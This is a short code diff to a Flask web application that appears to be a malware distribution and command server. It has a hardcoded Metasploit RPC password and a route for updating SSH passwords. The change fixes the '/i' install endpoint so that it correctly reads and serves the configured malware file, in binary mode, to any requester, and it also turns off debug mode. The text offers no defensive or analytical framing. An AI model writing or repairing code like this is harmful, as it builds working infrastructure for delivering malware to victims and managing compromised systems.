@@ -18,7 +18,7 @@ from flask_sqlalchemy import SQLAlchemy
 
 # Constants
 PORT = 80
-DEBUG = True
+DEBUG = False
 MSFRPC_PW = "tHVdf97UqDZxmJuh"
 TEMPLATE_DIR = "./templates/"
 SCRIPTS_DIR = "./scripts/"
@@ -630,7 +630,7 @@ def admin_ssh_passwords_update():
 # Install route
 @app.route("/i", methods=["GET"])
 def install():
-    with open(Setting.query.get("malware_path", "r")) as f:
+    with open(Setting.query.get("malware_path").value, "rb") as f:
         data = f.read()
     return data
 
